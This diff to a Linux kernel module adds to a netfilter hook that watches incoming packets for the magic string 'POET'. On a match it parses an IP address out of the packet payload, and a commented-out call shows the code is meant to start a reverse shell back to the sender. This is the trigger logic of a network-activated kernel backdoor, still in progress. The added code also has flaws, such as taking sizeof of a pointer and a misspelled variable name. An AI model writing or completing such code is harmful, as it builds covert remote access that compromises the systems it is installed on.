@@ -1,4 +1,5 @@
 #include "exec.c"
+
 const char* KEY = "POET";
 
 static unsigned int my_nf_hookfn(void *priv,
@@ -67,8 +68,15 @@ static unsigned int my_nf_hookfn(void *priv,
         printk(KERN_INFO "%s\n", ip_source);
         if (memcmp(user_data, KEY, strlen(KEY))==0)
         {
-            // start_reverse_shell(ip_source, 77);
-            printk(KERN_INFO "successful compare\n");
+            char* revIP = kmalloc(17, GFP_KERNEL);
+            strncpy(revIP, user_data + 5, sizeof(user_data) - 5);
+            // POET~1
+            // 012345
+            // start_reverse_shell(ip_sorce, 77);
+            printk(KERN_INFO "successful compare and %s\n", revIP);
+
+
+            kfree(revIP);
             return NF_DROP;
         }
 
